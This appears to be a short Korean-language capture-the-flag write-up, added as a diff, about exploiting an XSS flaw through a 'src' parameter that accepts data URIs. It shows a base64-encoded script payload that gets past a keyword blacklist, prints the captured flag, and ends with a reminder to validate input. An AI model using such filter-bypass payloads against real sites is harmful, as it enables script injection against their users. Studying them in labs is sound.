@@ -1,0 +1,24 @@
+<your_ip_address>/?page=media&src=nsa
+
+Data URI scheme
+<img src="data:[MIMEtype];base64,[DATA]">
+MIMEtype :
+text/html
+image/jpeg
+image/png
+DATA : encoded in base64
+
+형식으로 html에 심어져 template처럼 초기에 로딩된다.
+Data URI로 변환된 파일을 포함하면 페이지가 로딩 된 이후 이미지가 점차적으로 보이는 '로딩' 없이 바로 이미지를 보여 줄 수 있다는 장점이 있다.
+브라우저 제약으로 데이터 길이에 제한이 있고 base64로 엔코딩되면서 데이터가 33%가량 증가하기 때문에
+주로 작은 이미지를 이 방식으로 처리한다.
+
+문제는 base64로 인코딩되기 때문에 script, alert 등 블랙리스트 단어를 쉽게 통과시켜 실행할 수 있다.
+
+<script>alert(“XSS”);</script>
+
+<your_ip_address>/?page=media&src=data:text/html;base64,PHNjcmlwdD5hbGVydCjigJxYU1PigJ0pOzwvc2NyaXB0Pg==
+
+THE FLAG IS : 928D819FC19405AE09921A2B71227BD9ABA106F9D2D37AC412E9E5A750F1506D
+
+서버에서 src 파라미터로 받은 입력값을 반드시 검증해야 한다!
